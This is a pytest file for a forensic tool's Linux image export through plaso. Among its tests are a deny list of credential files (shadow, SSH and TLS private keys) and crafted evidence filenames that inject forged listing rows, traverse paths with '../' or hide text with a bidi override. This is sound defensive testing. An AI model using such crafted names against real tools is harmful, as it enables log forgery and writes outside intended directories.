"""export_linux_files: a Linux image Sleuth Kit cannot read, listed and exported through plaso.

Every test uses a real case database. plaso's command-line tools are stood in
for by :class:`FakePlaso`, which answers the way the real ones were seen to:
psort writes one JSON event per line with a path specification only for
files; image_export matches each path segment whole and without case, stores
some characters of a name as ``_``, and stops for good at a directory it
cannot read to the end; log2timeline only counts such a directory as a
warning, which pinfo then names. log2timeline and psort exit 0 on an image
they read, and a psort that runs out of space exits 1 with part of its output
written.
"""

from __future__ import annotations

import errno
import json
import os
import re
import shutil
import subprocess
from collections.abc import Iterator
from pathlib import Path
from types import SimpleNamespace
from typing import Any
from unittest.mock import MagicMock

import pytest

from mulder import dirroot, linuxvol
from mulder.audit import AuditLog
from mulder.db import CaseDB
from mulder.dirroot import LISTING_EXTRACTOR, detect_collection, dir_root, icat
from mulder.linuxvol import EXPORT_MARKER, EXPORTS_DIR, Scan, Volume, export_dir
from mulder.patterns import case_extract_dir
from mulder.server import app
from mulder.server.app import _tool_dispatch_sync
from mulder.server.tools import linux

ROOT = "p5/lvm1"
HOME = "p5/lvm2"
MODIFIED = 1_570_274_078  # 2019-10-05T11:14:38Z
TIMES = "2019-10-05T11:14:38Z\t-\t2016-04-03T16:05:51Z\t2019-10-06T08:00:00Z"
"""Modified, changed, created and accessed, as a row of the listing shows them."""


def _arg(argv: list[str], flag: str) -> str:
    """The value of *flag* as the tool takes it: the last one given."""
    return argv[len(argv) - argv[::-1].index(flag)]


def _events(
    path: str, volume: str = ROOT, kind: str = "file", size: int = 10, modified: int = MODIFIED
) -> list[dict[str, Any]]:
    """The events filestat writes for one entry; only a file carries a path specification."""
    base: dict[str, Any] = {
        "data_type": "fs:stat",
        # plaso spells control characters out here; the path specification keeps them.
        "filename": re.sub(r"[\x00-\x1f]", lambda m: f"\\x{ord(m.group()):02x}", path),
        "file_entry_type": kind,
        "file_size": size,
        "file_system_type": "EXT",
        "mode": 0o100644,
        "owner_identifier": 0,
        "group_identifier": 0,
    }
    if kind == "file":
        node: dict[str, Any] = {"type_indicator": "OS", "location": "/evidence/disk.E01"}
        node = {"type_indicator": "EWF", "parent": node}
        for part in filter(None, volume.split("/")):
            node = {"type_indicator": "VOLUME", "location": f"/{part}", "parent": node}
        base["pathspec"] = {"type_indicator": "EXT", "location": path, "parent": node}
    return [
        {**base, "timestamp": modified * 1_000_000, "timestamp_desc": "Content Modification Time"},
        {**base, "timestamp": 1_459_699_551_000_000, "timestamp_desc": "Creation Time"},
        {**base, "timestamp": 1_570_348_800_000_000, "timestamp_desc": "Last Access Time"},
    ]


class FakePlaso:
    """subprocess.run stand-in for log2timeline, psort, pinfo and image_export."""

    def __init__(self, files: dict[str, dict[str, bytes]], extra: list[dict[str, Any]] = ()):  # type: ignore[assignment]
        self.files = files
        self.events = [e for v, held in files.items() for p in held for e in _events(p, v)]
        self.events += list(extra)
        self.calls: list[list[str]] = []
        self.filters: dict[str, list[str]] = {}
        self.broken = ""
        """The tool that writes half of its output and exits 1."""
        self.leak: list[str] = []
        self.unreadable: dict[str, str] = {}
        """Directory to the first of its names that cannot be read: nothing from it on."""
        self.encrypted = False
        """Whether the image holds a partition plaso stops at unless told to stay off it."""

    def ran(self, tool: str) -> list[list[str]]:
        return [argv for argv in self.calls if Path(argv[0]).name == tool]

    def __call__(self, argv: list[str], **kwargs: Any) -> subprocess.CompletedProcess[str]:
        self.calls.append(list(argv))
        assert kwargs.get("stdin") is subprocess.DEVNULL, "plaso must never wait on stdin"
        tool = Path(argv[0]).name
        out = ""
        if tool == "log2timeline":
            if self.encrypted and _arg(argv, "--partitions") == "all":
                said = "Unable to proceed. Encrypted volume found but no mediator to determine\n"
                return subprocess.CompletedProcess(argv, 1, stdout=said, stderr="")
            Path(_arg(argv, "--storage_file")).write_bytes(b"plaso")
            if self.unreadable:
                count = len(self.unreadable)
                out = f"Number of warnings generated while extracting events: {count}.\n"
        elif tool == "psort":
            # In time order, as psort writes: cut short, it is the newest that are missing.
            events = sorted(self.events, key=lambda e: e.get("timestamp", 0))
            lines = [json.dumps(e) for e in events[: len(events) // (2 if self.broken else 1)]]
            Path(_arg(argv, "-w")).write_text("\n".join(lines), encoding="utf-8")
        elif tool == "pinfo":
            specs = {
                "type: OS, location: /evidence/disk.E01\ntype: EWF\n"
                "type: TSK_PARTITION, location: /p5, part_index: 6\n"
                "type: LVM, location: /lvm1, volume_index: 0\n"
                f"type: EXT, inode: 51, location: {directory}\n": 1
                for directory in self.unreadable
            }
            counters = {"storage_counters": {"warnings_by_path_spec": specs}}
            Path(_arg(argv, "-w")).write_text(json.dumps(counters), encoding="utf-8")
        elif tool == "image_export":
            parts = [f"p{_arg(argv, '--partitions')}", f"lvm{_arg(argv, '--volumes')}"]
            volume = "/".join(p for p in parts if not p.endswith("all"))
            text = Path(_arg(argv, "-f")).read_text(encoding="utf-8")
            wanted = [json.loads(line[2:]) for line in text.splitlines() if line.startswith("- ")]
            self.filters[volume] = [*self.filters.get(volume, []), *wanted]
            # A directory is read only when the filter leads into it.
            entered = {w.rpartition("/")[0].replace("\\", "") for w in wanted}
            for path, data in sorted(self.files.get(volume, {}).items()):
                directory, _, name = path.rpartition("/")
                if directory in entered and name >= self.unreadable.get(directory, "\U0010ffff"):
                    return subprocess.CompletedProcess(argv, 1, "OSError: unable to read\n", "")
                if path in self.leak or any(self._matches(w, path) for w in wanted):
                    stored = Path(_arg(argv, "-w")) / re.sub(r"[@+~%]", "_", path).lstrip("/")
                    stored.parent.mkdir(parents=True, exist_ok=True)
                    if not stored.exists():
                        stored.write_bytes(data)
        else:
            raise AssertionError(f"unexpected command: {argv}")
        if tool == self.broken:
            said = "OSError: [Errno 28] No space left on device\n"
            return subprocess.CompletedProcess(argv, 1, stdout=out, stderr=said)
        return subprocess.CompletedProcess(argv, 0, stdout=out, stderr="")

    @staticmethod
    def _matches(pattern: str, path: str) -> bool:
        """As dfVFS does: each segment a whole, case-insensitive regular expression."""
        want, have = pattern.split("/"), path.split("/")
        return len(want) == len(have) and all(
            re.fullmatch(w, h, re.IGNORECASE) for w, h in zip(want, have, strict=True)
        )


@pytest.fixture
def case(
    tmp_case_db: CaseDB,
    tmp_audit_log: AuditLog,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> Iterator[CaseDB]:
    ctx = app.ServerContext(
        case_id="test-case", db=tmp_case_db, correlator=MagicMock(), audit=tmp_audit_log
    )
    monkeypatch.setattr(app, "_ctx", ctx)
    monkeypatch.setattr(app, "_cfg", app.ServerConfig(db_dir=tmp_path / "cases"))
    monkeypatch.setattr(linux, "_find_plaso_cmd", lambda tool: [f"/usr/bin/{tool}"])
    # Whatever the machine the tests run on has free in its temporary directory.
    monkeypatch.setattr(shutil, "disk_usage", lambda path: SimpleNamespace(free=10**12))
    monkeypatch.setattr(linuxvol, "scan", lambda image: Scan())
    dirroot.refresh()
    yield tmp_case_db
    dirroot.refresh()


@pytest.fixture
def image(tmp_path: Path) -> str:
    path = tmp_path / "evidence" / "disk.E01"
    path.parent.mkdir()
    path.write_bytes(b"EVF")
    return str(path)


def _run(
    monkeypatch: pytest.MonkeyPatch, fake: FakePlaso, image: str, **kwargs: object
) -> dict[str, Any]:
    monkeypatch.setattr(subprocess, "run", fake)
    return dict(_tool_dispatch_sync["export_linux_files"](image_path=image, **kwargs))


def _text(db: CaseDB, source: str) -> str:
    return "".join(w.raw_text for w in db.get_windows_by_source(source))


def _held(root: Path) -> list[str]:
    return sorted(str(p.relative_to(root)) for p in root.rglob("*") if p.is_file())


SERVER = {
    ROOT: {
        "/etc/passwd": b"root:x:0:0:root:/root:/bin/bash\n",
        "/etc/hostname": b"web01\n",
        "/etc/cron.d/backup": b"* * * * * root /usr/local/bin/backup\n",
        "/lib/systemd/system/ssh@.service": b"[Service]\nExecStart=/usr/sbin/sshd -i\n",
        "/var/log/auth.log": b"Oct  5 11:00:01 web01 sshd[9]: Accepted password for root\n",
        "/var/www/html/index.php": b"<?php echo 1;\n",
        "/root/.bash_history": b"id\n",
        "/tmp/apache-xTRhUVX": b"#!/bin/sh\n",
        "/usr/bin/python3": b"\x7fELF",
        "/opt/app/config.php": b"<?php $db = 'x';\n",
    },
    "p1": {"/vmlinuz-3.13.0": b"kernel", "/grub/grub.cfg": b"menuentry\n"},
}


# --- the listing -----------------------------------------------------------


def test_every_entry_is_listed_with_its_volume_and_its_times(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    extra = [
        *_events("/etc/rc2.d", kind="directory"),
        *_events("/etc/rc2.d/S20ssh", kind="link"),  # its directory holds links only
        *_events("/home", kind="directory"),  # empty here; its files are on another volume
    ]
    result = _run(monkeypatch, FakePlaso(SERVER, extra), image)["results"]

    assert result["entries_listed"] == 15 and result["listing_truncated"] is False
    assert result["status"] == "exported" and result["listing_incomplete"] == []
    listing = _text(case, "linux.filelist")
    assert listing.startswith(
        "volume\ttype\tmode\tuid\tgid\tsize\tmodified\tchanged\tcreated\taccessed\tpath\n"
    )
    assert f"p5/lvm1\tfile\t0644\t0\t0\t10\t{TIMES}\t/etc/passwd\n" in listing
    assert f"p1\tfile\t0644\t0\t0\t10\t{TIMES}\t/grub/grub.cfg\n" in listing
    # A link has no path specification: it is on the volume its directory's files are on.
    assert re.search(r"^p5/lvm1\tlink\t.*\t/etc/rc2\.d/S20ssh$", listing, re.MULTILINE)
    # Nothing says which volume an empty top-level directory is on, and none is guessed.
    assert re.search(r"^\?\tdirectory\t.*\t/home$", listing, re.MULTILINE)
    # Not a tsk.filelist: the image tools would hand these inode numbers to icat.
    sources = {s.source_name: (s.extractor, s.source_path) for s in case.get_sources()}
    assert sources["linux.filelist"] == ("plaso", image)
    assert sources["tsk.filelist"][0] == LISTING_EXTRACTOR and sources["tsk.filelist"][1] != image


def test_the_files_are_listed_without_reading_or_hashing_them(
    case: CaseDB, image: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    fake = FakePlaso(SERVER)
    monkeypatch.chdir(tmp_path)
    _run(monkeypatch, fake, "evidence/disk.E01")

    (l2t,) = fake.ran("log2timeline")
    assert _arg(l2t, "--parsers") == "filestat" and _arg(l2t, "--hashers") == "none"
    # Nor are the gzip, bzip2 and xz files on the volume unpacked to look inside.
    assert "--skip_compressed_streams" in l2t
    assert "-u" in l2t and _arg(l2t, "--volumes") == "all"
    # The tools run in a directory of their own: a relative path would name nothing there.
    assert l2t[-1] == image and fake.ran("image_export")[0][-1] == image
    (psort,) = fake.ran("psort")
    assert _arg(psort, "-o") == "json_line", "the one output with exact names and the volume"


def test_a_streams_events_inside_a_file_are_not_entries(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """log2timeline looks inside gzip files and reports the member under the file's name."""
    member = _events("/var/log/syslog.1.gz")[0]
    member["pathspec"] = {"type_indicator": "GZIP", "parent": member["pathspec"]}
    member["file_size"] = 99_999
    fake = FakePlaso({ROOT: {"/var/log/syslog.1.gz": b"\x1f\x8b"}}, [member, {"junk": 1}])

    result = _run(monkeypatch, fake, image)["results"]

    assert result["entries_listed"] == 1
    assert f"\t10\t{TIMES}\t/var/log/syslog.1.gz" in _text(case, "linux.filelist")


def test_a_listing_past_the_limit_is_cut_and_says_so(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(linux, "_MAX_ENTRIES", 3)

    result = _run(monkeypatch, FakePlaso(SERVER), image)["results"]

    assert result["entries_listed"] == 3 and result["listing_truncated"] is True


# --- the export ------------------------------------------------------------


def test_the_targeted_set_is_exported_as_one_tree(
    case: CaseDB, image: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    fake = FakePlaso(SERVER)
    result = _run(monkeypatch, fake, image)["results"]

    root = Path(result["export_root"])
    # Where the planner was told it would be, before it existed.
    assert root == export_dir(case_extract_dir(tmp_path / "cases", "test-case"), image)
    assert _held(root) == [
        "etc/cron.d/backup",
        "etc/hostname",
        "etc/passwd",
        "lib/systemd/system/ssh@.service",
        "root/.bash_history",
        "tmp/apache-xTRhUVX",
        "var/log/auth.log",
        "var/www/html/index.php",
    ]
    # What mulder keeps about the export sits beside the tree, not in it.
    assert sorted(p.name for p in root.parent.iterdir()) == [
        EXPORT_MARKER,
        "filelist.tsv",
        "files",
    ]
    assert result["files_exported"] == 8
    assert result["selected"] == {"config": 4, "logs": 1, "homes": 1, "web": 1, "tmp": 1}
    assert result["volumes"] == [
        "p1 (EXT, 2 files, 0 exported to boot/): read as /boot, guessed from its top-level names",
        "p5/lvm1 (EXT, 10 files, 8 exported to ./): the root volume: it holds etc/passwd",
    ]
    # One run per volume that has something to export, selected as dfVFS names it.
    (export,) = fake.ran("image_export")
    assert _arg(export, "--partitions") == "5" and _arg(export, "--volumes") == "1"
    assert "--include_duplicates" in export and "--no_hashes" in export and "-u" in export
    assert _arg(export, "-w") == str(root) and export[-1] == image
    assert "/etc/passwd" in fake.filters[ROOT] and "/usr/bin/python3" not in fake.filters[ROOT]
    assert (Path(image).parent / "disk.E01").read_bytes() == b"EVF"
    assert sorted(p.name for p in Path(image).parent.iterdir()) == ["disk.E01"]


def test_an_exported_file_gets_its_name_and_its_time_back(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """image_export stored ssh@.service as ssh_.service, stamped with the time of the copy."""
    root = Path(_run(monkeypatch, FakePlaso(SERVER), image)["results"]["export_root"])

    unit = root / "lib/systemd/system/ssh@.service"
    assert unit.read_bytes().startswith(b"[Service]")
    assert not (unit.parent / "ssh_.service").exists()
    assert int(unit.stat().st_mtime) == MODIFIED
    assert int((root / "etc/passwd").stat().st_mtime) == MODIFIED


def test_names_image_export_would_store_as_one_are_not_exported_together(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Whose content the one stored file holds cannot be told, so neither is given a row."""
    files = {
        ROOT: {
            "/etc/passwd": b"x\n",
            "/etc/hosts~": b"old\n",
            "/etc/hosts+": b"new\n",
            "/etc/x y": b"a space is not replaced\n",
            "/etc/x_y": b"so this is no twin of it\n",
        }
    }
    fake = FakePlaso(files)

    result = _run(monkeypatch, fake, image)["results"]

    root = Path(result["export_root"])
    assert _held(root) == ["etc/passwd", "etc/x y", "etc/x_y"]
    assert (root / "etc/x y").read_bytes() == b"a space is not replaced\n"
    (reason,) = [r for r in result["not_exported"] if "another file's too" in r]
    assert result["not_exported"][reason] == ["p5/lvm1:/etc/hosts+", "p5/lvm1:/etc/hosts~"]
    assert result["status"] == "exported", "left out on purpose, and named: not a failure"

    # One of them alone has no twin in its run, and gets its own name.
    alone = _run(monkeypatch, fake, image, paths=["/etc/hosts~"])["results"]["requested"]
    assert Path(alone["exported"][0]).read_bytes() == b"old\n"
    assert alone["exported"][0].endswith("/etc/hosts~")


def test_the_export_holds_the_files_asked_for_and_nothing_else(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """image_export matches without case, so the filter for one name can fetch another file."""
    fake = FakePlaso({ROOT: {"/etc/passwd": b"x\n", "/tmp/a.bin": b"small\n"}})
    fake.files[ROOT]["/tmp/CORE"] = b"not asked for\n"
    fake.events += _events("/tmp/CORE", size=65 * 1024 * 1024)
    fake.leak = ["/tmp/CORE"]

    result = _run(monkeypatch, fake, image)["results"]

    assert result["not_exported"]["larger than 64 MiB"] == ["p5/lvm1:/tmp/CORE"]
    assert _held(Path(result["export_root"])) == ["etc/passwd", "tmp/a.bin"]


def test_a_volume_mounted_at_home_is_exported_at_home(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The RHEL default: the planner is told to index "home", and that is where the files are."""
    files = {**SERVER, HOME: {"/alice/.bashrc": b"alias l=ls\n", "/alice/thesis.odt": b"PK"}}
    files[HOME]["/alice/.bash_history"] = b"ALICEHISTORY\n"
    result = _run(monkeypatch, FakePlaso(files), image)["results"]
    root = result["export_root"]

    assert result["volumes"][2] == (
        "p5/lvm2 (EXT, 3 files, 2 exported to home/): read as /home, guessed from the "
        "dotfiles in its directories"
    )
    assert not (Path(root) / "home/alice/thesis.odt").exists()  # dotfiles and .ssh only
    # A plain Linux file tree: nothing in mulder has to know that it is an export.
    collection = detect_collection(Path(root))
    assert collection is not None and (collection.layout, collection.host) == ("linux", "web01")
    listing = dir_root(root).listing()  # type: ignore[union-attr]
    assert "\tetc/passwd\n" in listing and "\thome/alice/.bashrc" in listing
    assert EXPORT_MARKER not in listing and "filelist.tsv" not in listing
    assert "\thome/alice/.bash_history" in _text(case, "tsk.filelist")

    with pytest.MonkeyPatch.context() as patched:
        patched.setattr("mulder.server.tools.extract.app_files.shutil.which", lambda name: name)
        indexed = _tool_dispatch_sync["index_app_files"](
            case_id="test-case", image_path=root, directory_pattern="home"
        )["results"]
    assert indexed["files_indexed"] == 2
    assert "ALICEHISTORY" in _text(case, "appfiles.home..bash_history")


def test_var_and_var_log_on_volumes_of_their_own_still_yield_their_logs(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A hardened layout: a file's path on its volume lacks the mount point."""
    files = {
        ROOT: {"/etc/passwd": b"x\n"},
        "p5/lvm2": {"/lib/dpkg/status": b"Package: x\n", "/www/html/a.php": b"<?php\n"},
        "p5/lvm3": {"/auth.log": b"Oct  5 sshd\n", "/journal/abc/system.journal": b"LPKSHHRH"},
        "p5/lvm4": {"/data/blob.bin": b"\x00", "/etc/motd": b"another root?\n"},
        "p5/lvm5": {"/bob/.profile": b"x\n"},
        "p5/lvm6": {"/carol/.profile": b"y\n"},
        # A database's data volume: a directory named journal does not make it /var/log.
        "p5/lvm7": {"/journal/WiredTigerLog.0000000001": b"\x00", "/WiredTiger.wt": b"\x00"},
    }
    files["p5/lvm2"]["/log/placeholder"] = b""  # the mount point of the third volume
    files["p5/lvm2"]["/cache/man/index.db"] = b"\x00"

    result = _run(monkeypatch, FakePlaso(files), image)["results"]

    assert _held(Path(result["export_root"])) == [
        "etc/passwd",
        "home/bob/.profile",
        "p5_lvm4/etc/motd",  # no place of its own in the tree: under its own name
        "p5_lvm6/carol/.profile",  # /home is taken
        "var/lib/dpkg/status",
        "var/log/auth.log",
        "var/log/journal/abc/system.journal",
        "var/log/placeholder",
        "var/www/html/a.php",
    ]
    said = [line.split("): ", 1)[1] for line in result["volumes"]]
    assert said == [
        "the root volume: it holds etc/passwd",
        "read as /var, guessed from its top-level names",
        "read as /var/log, guessed from its top-level names",
        "mount point not recognised: read as a root volume",
        "read as /home, guessed from the dotfiles in its directories",
        "read as /home, guessed from the dotfiles in its directories (another volume has "
        "that place, so its files are under its own name)",
        "mount point not recognised: read as a root volume",
    ]
    assert "exported to p5_lvm6/" in result["volumes"][5]


def test_a_mount_point_is_guessed_from_two_signs_not_one() -> None:
    """One name is a database's journal directory, an application's log, a user called secure."""
    guess = linux._mount
    assert guess({"journal/WiredTigerLog.0000000001", "WiredTiger.wt"})[0] is None
    assert guess({"log/app.log", "lib/app.jar", "bin/run.sh", "conf/app.conf"})[0] is None
    assert guess({"secure/.bashrc", "bob/.bashrc"})[0] == "home/"
    assert guess({"wtmp", "messages", "secure"})[0] == "var/log/"
    # /var with /var/log on a volume of its own: its log directory holds no file.
    assert guess({"lib/rpm/Packages", "cache/dnf/x", "spool/cron/root"})[0] == "var/"


def test_a_file_under_a_mount_point_gives_way_to_the_mounted_volumes(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Written before the volume was mounted, or hidden there: the running system showed it not."""
    files = {
        ROOT: {
            "/etc/passwd": b"x\n",
            "/var/log/auth.log": b"under the mount point\n",
            "/home/alice/.bashrc": b"under the mount point\n",
            "/home/alice/.bash_logout": b"only on the root volume\n",
        },
        "p5/lvm3": {"/auth.log": b"Oct  5 sshd\n", "/wtmp": b"\x00"},
        HOME: {"/alice/.bashrc": b"alias l=ls\n"},
    }
    fake = FakePlaso(files)

    result = _run(monkeypatch, fake, image)["results"]

    root = Path(result["export_root"])
    assert (root / "var/log/auth.log").read_bytes() == b"Oct  5 sshd\n"
    assert (root / "home/alice/.bashrc").read_bytes() == b"alias l=ls\n"
    assert (root / "home/alice/.bash_logout").read_bytes() == b"only on the root volume\n"
    (reason,) = [r for r in result["not_exported"] if r.startswith("under a mount point")]
    assert result["not_exported"][reason] == [
        "p5/lvm1:/home/alice/.bashrc",
        "p5/lvm1:/var/log/auth.log",
    ]
    assert result["status"] == "exported" and "p5/lvm1 (EXT, 4 files, 2 exported" in str(result)
    assert not any("another file's too" in r for r in result["not_exported"])

    # A file hidden under a mount point is worth reading: by its own path it is alone.
    asked = _run(monkeypatch, fake, image, paths=["/var/log/auth.log"])["results"]["requested"]
    assert Path(asked["exported"][0]).read_bytes() == b"under the mount point\n"


def test_a_file_under_a_mount_point_does_not_stand_in_for_a_mounted_one_left_out(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A syslog past the size limit, and the early-boot copy on the root volume beneath it:
    exported at the same path, the stale one would be read as the system's log."""
    files = {
        ROOT: {"/etc/passwd": b"x\n", "/var/log/syslog": b"written before the mount\n"},
        "p5/lvm3": {"/syslog": b"stands for 100 MiB", "/wtmp": b"\x00", "/auth.log": b"a\n"},
    }
    fake = FakePlaso(files)
    for event in fake.events:
        if event["filename"] == "/syslog":
            event["file_size"] = 100 * 1024 * 1024

    result = _run(monkeypatch, fake, image)["results"]

    root = Path(result["export_root"])
    assert _held(root) == ["etc/passwd", "var/log/auth.log", "var/log/wtmp"]
    (reason,) = [r for r in result["not_exported"] if r.startswith("under a mount point")]
    assert result["not_exported"][reason] == ["p5/lvm1:/var/log/syslog"]
    assert result["not_exported"]["larger than 64 MiB"] == ["p5/lvm3:/syslog"]
    # By its own path it is still to be had.
    asked = _run(monkeypatch, fake, image, paths=["/var/log/syslog"])["results"]["requested"]
    assert Path(asked["exported"][0]).read_bytes() == b"written before the mount\n"


def test_password_hashes_on_a_volume_mounted_at_var_are_not_exported_on_request(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """There the file is /backups/shadow.bak: the name is checked with the volume's place."""
    var = {
        "/lib/dpkg/status": b"Package: x\n",
        "/cache/man/index.db": b"\x00",
        "/spool/cron/crontabs/root": b"@reboot /x\n",
        "/backups/shadow.bak": b"root:$6$salt$hash:19000:0:99999:7:::\n",
        "/backups/gshadow.bak": b"root:*::\n",
        "/backups/passwd.bak": b"root:x:0:0::/root:/bin/sh\n",
    }
    fake = FakePlaso({ROOT: {"/etc/passwd": b"x\n"}, "p5/lvm2": var})
    _run(monkeypatch, fake, image)

    asked = _run(monkeypatch, fake, image, paths=["/backups/shadow.bak", "/backups"])
    requested = asked["results"]["requested"]

    assert _held(Path(requested["root"])) == ["var/backups/passwd.bak"]
    assert requested["not_exported"] == {
        "not exported (password hashes and private keys, by name)": [
            "p5/lvm2:/backups/gshadow.bak",
            "p5/lvm2:/backups/shadow.bak",
        ]
    }
    assert not any("shadow" in p for p in fake.filters["p5/lvm2"])
    # Nor from a volume whose place is not known, where no prefix can be added.
    assert linuxvol.SECRET_FILES.search("backups/shadow.bak")
    assert not linuxvol.SECRET_FILES.search("backups/passwd.bak")


def test_what_an_account_leaves_in_its_home_is_exported_wherever_the_home_is(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """mail with /var/mail and a shell, php with /usr/php: not under /home, and the intruder's."""
    homes = {
        "/etc/passwd": b"mail:x:8:8:mail:/var/mail:/bin/bash\nphp:x:999:999::/usr/php:/bin/bash\n",
        "/var/mail/.bash_history": b"sudo su -\npasswd php\n",
        "/usr/php/.bashrc": b"alias l=ls\n",
        "/usr/php/.profile": b"umask 022\n",
        "/usr/php/.viminfo": b"# viminfo\n",
        "/usr/php/bin/php": b"\x7fELF",
        "/var/lib/postgresql/.ssh/authorized_keys": b"ssh-ed25519 AAAA intruder@kali\n",
        "/var/lib/postgresql/.ssh/id_ed25519": b"-----BEGIN OPENSSH PRIVATE KEY-----\n",
        "/var/lib/postgresql/.psql_history": b"select 1;\n",
        "/var/lib/postgresql/14/main/PG_VERSION": b"14\n",
        "/srv/git/.config/systemd/user/sync.service": b"[Service]\nExecStart=/tmp/x\n",
        "/var/keys/deploy/authorized_keys": b"ssh-rsa AAAA deploy@ci\n",
    }
    result = _run(monkeypatch, FakePlaso({ROOT: homes}), image)["results"]

    assert _held(Path(result["export_root"])) == [
        "etc/passwd",
        "srv/git/.config/systemd/user/sync.service",
        "usr/php/.bashrc",
        "usr/php/.profile",
        "usr/php/.viminfo",
        "var/keys/deploy/authorized_keys",
        "var/lib/postgresql/.psql_history",
        "var/lib/postgresql/.ssh/authorized_keys",
        "var/mail/.bash_history",
    ]
    assert result["selected"]["homes"] == 8
    assert result["not_exported"] == {
        "not exported (password hashes and private keys, by name)": [
            "p5/lvm1:/var/lib/postgresql/.ssh/id_ed25519"
        ]
    }


def test_a_single_file_system_needs_no_volume_selector(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    fake = FakePlaso({"": {"/etc/passwd": b"root:x:0:0::/root:/bin/sh\n"}})

    result = _run(monkeypatch, fake, image)["results"]

    (export,) = fake.ran("image_export")
    assert _arg(export, "--partitions") == "all" and _arg(export, "--volumes") == "all"
    assert (Path(result["export_root"]) / "etc/passwd").is_file()
    assert _text(case, "linux.filelist").splitlines()[1].startswith("-\tfile\t")


def test_password_hashes_and_private_keys_do_not_reach_the_case_directory(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    secrets = [
        "/etc/shadow",
        "/etc/gshadow-",
        "/etc/SHADOW",  # image_export matches without case: this name would fetch the other
        "/etc/security/opasswd",
        "/etc/ssh/ssh_host_rsa_key",
        "/root/.ssh/id_ed25519",
        "/etc/ssl/private/site.key",
        "/etc/letsencrypt/live/site/privkey1.pem",
        "/var/backups/shadow.bak",  # Debian's daily copy
        "/var/backups/gshadow.bak",
    ]
    public = ["/etc/passwd", "/etc/ssh/ssh_host_rsa_key.pub", "/root/.ssh/id_ed25519.pub"]
    fake = FakePlaso({ROOT: dict.fromkeys(secrets + public, b"secret\n")})
    fake.leak = ["/etc/shadow"]  # even if the filter were to let one through

    result = _run(monkeypatch, fake, image)["results"]

    root = Path(result["export_root"])
    assert _held(root) == sorted(p.lstrip("/") for p in public)
    assert not set(secrets) & set(fake.filters[ROOT])
    refused = result["not_exported"]["not exported (password hashes and private keys, by name)"]
    # /var/backups is outside the targeted set, so its two are not even candidates.
    assert "p5/lvm1:/etc/shadow" in refused and len(refused) == len(secrets) - 2
    # Listed all the same: that the file exists, its size and its times are evidence.
    assert "\t/etc/shadow\n" in _text(case, "linux.filelist")
    assert "by their well-known names" in result["note"]

    again = _run(monkeypatch, fake, image, paths=["/etc/shadow", "/root/.ssh", "/var/backups"])
    asked = again["results"]["requested"]
    assert list(asked["not_exported"]) == [
        "not exported (password hashes and private keys, by name)"
    ]
    assert "p5/lvm1:/var/backups/shadow.bak" in list(asked["not_exported"].values())[0]
    assert _held(Path(asked["root"])) == ["root/.ssh/id_ed25519.pub"]
    assert _held(root) == sorted(p.lstrip("/") for p in public)


def test_size_limits_keep_the_newest_and_name_what_was_left(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    mib = 1024 * 1024
    fake = FakePlaso({ROOT: {"/etc/passwd": b"x\n"}})
    for day, name in enumerate(["old", "mid", "new", "newest", "latest"]):
        fake.files[ROOT][f"/tmp/{name}.bin"] = b"stands for 60 MiB"
        fake.events += _events(f"/tmp/{name}.bin", size=60 * mib, modified=MODIFIED + day * 86400)
    fake.events += _events("/var/log/huge.log", size=65 * mib)

    result = _run(monkeypatch, fake, image)["results"]

    kept = [p for p in fake.filters[ROOT] if p.startswith("/tmp/")]
    assert sorted(kept) == [
        "/tmp/latest\\.bin",
        "/tmp/mid\\.bin",
        "/tmp/new\\.bin",
        "/tmp/newest\\.bin",
    ]
    assert result["not_exported"] == {
        "larger than 64 MiB": ["p5/lvm1:/var/log/huge.log"],
        "over the limit for tmp": ["p5/lvm1:/tmp/old.bin"],
    }
    assert result["status"] == "exported", "limits are not failures"


def test_a_file_image_export_does_not_write_is_named(
    case: CaseDB, image: str, monkeypatch: pytest.MonkeyPatch
) -> None:
    """It reports success whether or not it found the file it was asked for."""
    fake = FakePlaso({ROOT: {"/etc/passwd": b"x\n"}})
    fake.events += _events("/etc/gone.conf")  # listed, and not there to be copied

    result = _run(monkeypatch, fake, image)["results"]

    assert result["not_exported"] == {"image_export did not copy it": ["p5/lvm1:/etc/gone.conf"]}
    assert result["status"] == "incomplete" and result["files_exported"] == 1


def test_a_name_from_the_evidence_cannot_forge_a_row_or_leave_the_export(
    case: CaseDB, image: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    forged = "/etc/x\np5/lvm1\tfile\t0644\t0\t0\t1\t-\t-\t-\t/etc/planted"
    separators = "/etc/a b\u0085c d‮e"  # line breaks to str.splitlines, and a bidi override
    fake = FakePlaso({ROOT: {"/etc/passwd": b"x\n", "/etc/a\\..\\..\\..\\b": b"backslashes\n"}})
    fake.events += _events(forged) + _events("/etc/../../../outside") + _events("/etc/a%b{c}.conf")
    fake.events += _events(separators)
    outside = tmp_path / "cases/extracted/outside"
    outside.parent.mkdir(parents=True)
    outside.write_bytes(b"mine")
    before = outside.stat().st_mtime_ns

    result = _run(monkeypatch, fake, image)["results"]

    listing = _text(case, "linux.filelist")
    assert "/etc/x^p5/lvm1^file^" in listing and "\n" + forged.split("\n")[1] not in listing
    assert "\t/etc/a^b^c^d^e\n" in listing
    rows = listing.rstrip("\n")
